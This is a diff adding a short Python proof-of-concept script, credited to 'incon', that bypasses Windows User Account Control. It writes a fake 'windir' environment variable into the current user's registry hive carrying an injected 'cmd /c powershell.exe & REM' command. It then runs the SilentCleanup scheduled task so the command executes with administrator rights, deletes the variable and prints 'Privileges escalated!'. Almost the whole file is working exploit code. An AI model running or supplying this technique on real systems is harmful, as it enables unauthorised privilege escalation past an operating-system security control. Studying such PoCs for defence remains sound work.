@@ -1,0 +1,35 @@
+import winreg
+import subprocess
+
+# this is the user specified command
+# that will be executed with administrator privileges
+SHELL_COMMAND = 'powershell.exe'
+
+def main():
+    print('\t\tPoC by: incon (Inc0nsistentcys)\n')
+    print(f'Shell command to run: {SHELL_COMMAND}\n')
+    
+    print('Creating new temporary WINDIR environment variable...')
+
+    # create a temporary environment variable for the current user
+    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Environment')
+    winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, f'cmd /c {SHELL_COMMAND} & REM ')
+    winreg.CloseKey(key)
+
+    print('Starting new SilentCleanup process...')
+
+    # run SilentCleanup through Task Scheduler
+    subprocess.call(r'schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I > nul', shell=True)
+
+    print('Deleting temporary WINDIR environment variable...')
+
+    # delete the temporary environment variable
+    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Environment')
+    winreg.DeleteValue(key, 'windir')
+
+    print("\n   ___          ___   (o o)        (o o) (  V  ) 1337 (  V  )--m-m----------m-m--  \"\"\nPrivileges escalated!")
+
+    input('\nPress ENTER to exit...')
+
+if __name__ == '__main__':
+    main() 
